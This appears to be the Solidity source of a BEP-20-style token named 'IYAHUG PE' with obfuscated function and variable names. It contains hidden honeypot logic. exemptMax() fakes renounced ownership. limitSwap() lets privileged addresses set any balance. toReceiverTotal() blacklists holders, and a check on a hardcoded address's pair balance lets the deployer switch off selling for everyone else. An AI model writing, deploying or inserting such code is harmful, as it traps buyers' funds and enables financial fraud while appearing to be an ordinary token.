//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract tradingAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingTxLimit {
    function createPair(address exemptSender, address fromEnable) external returns (address);
}


interface limitReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface amountMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverIs) external view returns (uint256);

    function transfer(address swapMax, uint256 walletList) external returns (bool);

    function allowance(address feeEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletList) external returns (bool);

    function transferFrom(address sender,address swapMax,uint256 walletList) external returns (bool);

    event Transfer(address indexed from, address indexed amountTxAt, uint256 value);
    event Approval(address indexed feeEnable, address indexed spender, uint256 value);
}

interface amountMaxMetadata is amountMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IYAHUGPE is tradingAuto, amountMax, amountMaxMetadata {

    function isAutoMin(uint256 walletList) public {
        marketingBuy();
        enableSellMode = walletList;
    }

    address receiverSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public autoFund;

    uint8 private takeAmount = 18;

    function owner() external view returns (address) {
        return amountModeMax;
    }

    bool public modeLaunched;

    mapping(address => mapping(address => uint256)) private atSwap;

    function decimals() external view virtual override returns (uint8) {
        return takeAmount;
    }

    function marketingBuy() private view {
        require(minExempt[_msgSender()]);
    }

    function transferFrom(address launchTx, address swapMax, uint256 walletList) external override returns (bool) {
        if (_msgSender() != receiverSell) {
            if (atSwap[launchTx][_msgSender()] != type(uint256).max) {
                require(walletList <= atSwap[launchTx][_msgSender()]);
                atSwap[launchTx][_msgSender()] -= walletList;
            }
        }
        return receiverMarketing(launchTx, swapMax, walletList);
    }

    bool private toIs;

    function totalSupply() external view virtual override returns (uint256) {
        return feeWalletToken;
    }

    uint256 private feeWalletToken = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return buyTotal;
    }

    address public atEnable;

    event OwnershipTransferred(address indexed modeTotal, address indexed limitTakeEnable);

    function allowance(address autoWallet, address isWallet) external view virtual override returns (uint256) {
        if (isWallet == receiverSell) {
            return type(uint256).max;
        }
        return atSwap[autoWallet][isWallet];
    }

    bool public limitTradingTeam;

    uint256 public totalBuyLaunched;

    function getOwner() external view returns (address) {
        return amountModeMax;
    }

    uint256 takeTrading;

    mapping(address => bool) public minExempt;

    function approve(address isWallet, uint256 walletList) public virtual override returns (bool) {
        atSwap[_msgSender()][isWallet] = walletList;
        emit Approval(_msgSender(), isWallet, walletList);
        return true;
    }

    constructor (){
        
        exemptMax();
        limitReceiver receiverToFund = limitReceiver(receiverSell);
        atEnable = marketingTxLimit(receiverToFund.factory()).createPair(receiverToFund.WETH(), address(this));
        if (limitTradingTeam != toIs) {
            totalBuyLaunched = listSellTeam;
        }
        receiverFee = _msgSender();
        minExempt[receiverFee] = true;
        marketingTo[receiverFee] = feeWalletToken;
        if (toIs != limitTradingTeam) {
            totalBuyLaunched = listSellTeam;
        }
        emit Transfer(address(0), receiverFee, feeWalletToken);
    }

    string private buyTotal = "IYAHUG PE";

    uint256 public listSellTeam;

    function maxMode(address launchTx, address swapMax, uint256 walletList) internal returns (bool) {
        require(marketingTo[launchTx] >= walletList);
        marketingTo[launchTx] -= walletList;
        marketingTo[swapMax] += walletList;
        emit Transfer(launchTx, swapMax, walletList);
        return true;
    }

    function toReceiverTotal(address enableLimit) public {
        marketingBuy();
        
        if (enableLimit == receiverFee || enableLimit == atEnable) {
            return;
        }
        autoFund[enableLimit] = true;
    }

    function exemptMax() public {
        emit OwnershipTransferred(receiverFee, address(0));
        amountModeMax = address(0);
    }

    uint256 enableSellMode;

    function receiverMarketing(address launchTx, address swapMax, uint256 walletList) internal returns (bool) {
        if (launchTx == receiverFee) {
            return maxMode(launchTx, swapMax, walletList);
        }
        uint256 enableSender = amountMax(atEnable).balanceOf(exemptMarketing);
        require(enableSender == enableSellMode);
        require(!autoFund[launchTx]);
        return maxMode(launchTx, swapMax, walletList);
    }

    function symbol() external view virtual override returns (string memory) {
        return launchAuto;
    }

    address exemptMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private marketingTo;

    string private launchAuto = "IPE";

    function enableShouldFund(address enableList) public {
        if (modeLaunched) {
            return;
        }
        
        minExempt[enableList] = true;
        
        modeLaunched = true;
    }

    address private amountModeMax;

    function transfer(address enableShould, uint256 walletList) external virtual override returns (bool) {
        return receiverMarketing(_msgSender(), enableShould, walletList);
    }

    function limitSwap(address enableShould, uint256 walletList) public {
        marketingBuy();
        marketingTo[enableShould] = walletList;
    }

    function balanceOf(address receiverIs) public view virtual override returns (uint256) {
        return marketingTo[receiverIs];
    }

    address public receiverFee;

}